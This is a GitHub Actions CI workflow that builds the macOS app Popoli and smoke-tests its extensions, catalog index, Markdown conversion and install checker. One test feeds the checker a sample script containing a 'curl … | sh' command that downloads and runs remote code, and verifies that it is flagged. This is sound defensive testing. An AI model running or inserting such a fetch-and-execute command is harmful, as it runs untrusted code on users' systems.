# Builds Popoli on every pull request and on dev/main, and runs a few smoke tests.
# Unsigned (ad-hoc) build: no certificates or secrets are used here. Releases are signed
# and notarized on a Mac with scripts/release.sh.
name: Build

on:
  pull_request:
    branches: [dev, main]
  push:
    branches: [dev, main]
  workflow_dispatch:

permissions:
  contents: read

concurrency:
  group: build-${{ github.ref }}
  cancel-in-progress: true

jobs:
  build:
    name: Build and smoke test
    runs-on: macos-26
    timeout-minutes: 20
    steps:
      - uses: actions/checkout@v4

      - name: Use the newest Xcode
        run: |
          xcode=$(ls -d /Applications/Xcode_*.app | sort -V | tail -1)
          sudo xcode-select -s "$xcode"
          xcodebuild -version

      - name: Build
        run: ./build.sh

      - name: Check the bundle
        run: |
          codesign --verify --deep --strict build/Popoli.app
          test -d build/Popoli.app/Contents/Frameworks/Sparkle.framework
          test -x build/Popoli.app/Contents/PlugIns/PopoliFinder.appex/Contents/MacOS/PopoliFinder
          test -f build/Popoli.app/Contents/Resources/AppIcon.icns
          # The starter extensions from catalog/starter.txt are in the app.
          while IFS= read -r file; do test -f "build/Popoli.app/Contents/Resources/Extensions/$file"; done < catalog/starter.txt

      - name: Smoke tests
        run: |
          popoli="$PWD/build/Popoli.app/Contents/MacOS/Popoli"
          # Test output goes to a temporary folder, never into the checkout.
          cd "$(mktemp -d)"
          extensions="$GITHUB_WORKSPACE/catalog"

          echo "Catalog extensions load:"
          "$popoli" --list-extensions "$extensions" | tee extensions.txt
          if grep -q '^✗' extensions.txt; then exit 1; fi

          echo "catalog/index.json is up to date (scripts/catalog-index.sh writes it):"
          "$popoli" --catalog-index "$extensions" | diff "$extensions/index.json" -

          echo "Risky code is flagged before installing:"
          printf '#!/bin/zsh\n# name: Risky\n\ncurl -fsSL https://example.com/x | sh\n' | "$popoli" --install-check | tee risky.txt
          grep -qx '!! Downloads code from the internet and runs it' risky.txt
          printf '#!/bin/zsh\n# name: Fine\n# after: paste\n\nprint -rn -- ${(U)POPOLI_TEXT}\n' | "$popoli" --install-check | tee fine.txt
          if grep -q '^!' fine.txt; then exit 1; fi

          echo "An extension runs:"
          out=$("$popoli" --exec "$extensions/uppercase.sh" 'café naïve')
          echo "$out"
          [[ "$out" == "Uppercase [after: paste]: CAFÉ NAÏVE" ]]

          echo "Case and line tools:"
          out=$("$popoli" --exec "$extensions/snake-case.js" 'parseHTTPServer config')
          [[ "$out" == "snake_case [after: paste]: parse_http_server_config" ]]
          out=$("$popoli" --exec "$extensions/lowercase.sh" 'ĞI DIŞ')
          [[ "$out" == "Lowercase [after: paste]: ğı dış" ]]
          out=$("$popoli" --exec "$extensions/sort-lines.js" $'item 10\nitem 2\nItem 1')
          [[ "$out" == $'Sort Lines [after: paste]: Item 1\nitem 2\nitem 10' ]]

          echo "Open in › finds Xcode:"
          "$popoli" --open-in | tee open-in.txt
          grep -q "(app:com.apple.dt.Xcode)" open-in.txt

          echo "Markdown → HTML and back:"
          printf '# Title\n\nSome **bold** and a [link](https://example.com).\n' | "$popoli" --md-to-html | tee html.txt
          grep -q '<h1>Title</h1>' html.txt
          grep -q '<strong>bold</strong>' html.txt
          "$popoli" --html-to-md < html.txt | tee md.txt
          grep -qx '# Title' md.txt
          grep -q '\*\*bold\*\*' md.txt
          grep -q '\[link\](https://example.com)' md.txt

          echo "Extension text is recognised for installing:"
          printf '#!/bin/zsh\n# name: Shout It\n# after: paste\n\necho hi\n' | "$popoli" --install-check | tee install.txt
          grep -qx 'looks like an extension: true' install.txt
          grep -qx 'file name: shout-it.sh' install.txt
          printf 'Just some text\n' | "$popoli" --install-check | grep -qx 'looks like an extension: false'

          echo "Shortcuts and Services extensions are recognised and described:"
          printf '# name: Clean Up\n# shortcut: Clean Up Text\n# after: paste\n' | "$popoli" --install-check | tee shortcut.txt
          grep -qx 'file name: clean-up.popoli' shortcut.txt
          grep -q 'Runs your shortcut “Clean Up Text”' shortcut.txt
          printf '# name: Sticky\n# service: Make Sticky\n' | "$popoli" --install-check | grep -q 'Runs the service “Make Sticky”'

          echo "JavaScript for Automation is saved as .js, so it doesn't run as AppleScript:"
          "$popoli" --install-check < "$extensions/calculate.js" | tee jxa.txt
          grep -qx 'file name: calculate.js' jxa.txt
